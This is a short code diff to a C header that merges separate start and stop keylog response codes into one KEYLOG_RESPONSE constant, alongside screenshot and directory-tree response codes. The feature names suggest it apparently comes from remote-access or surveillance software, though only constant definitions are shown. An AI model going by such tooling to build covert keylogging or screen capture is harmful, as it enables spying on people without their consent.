@@ -17,8 +17,7 @@
 
 #define SCREENSHOT_RESPONSE ((1 << 4) | (1 << 3) | (1 << 0))
 
-#define START_KEYLOG_RESPONSE ((1 << 5) | (1 << 0))
-#define STOP_KEYLOG_RESPONSE ((1 << 5) | (1 << 1))
+#define KEYLOG_RESPONSE ((1 << 5) | (1 << 0))
 
 #define DIR_TREE_RESPONSE ((1 << 5) | (1 << 3) | (1 << 0))
 
